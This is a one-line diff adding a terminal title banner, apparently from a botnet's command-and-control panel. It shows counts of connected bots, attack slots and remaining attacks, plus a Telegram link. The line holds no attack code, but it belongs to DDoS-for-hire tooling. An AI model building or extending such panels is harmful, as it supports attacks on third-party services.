@@ -1,0 +1,1 @@
+\033]0;Connected: <<$botcount>> | Slots <<$ongoing>>/<<$maxglobal>> | <<$totalattacks>>/<<$maxattacks>> Attacks Left | t.me/GodSendRaw\007
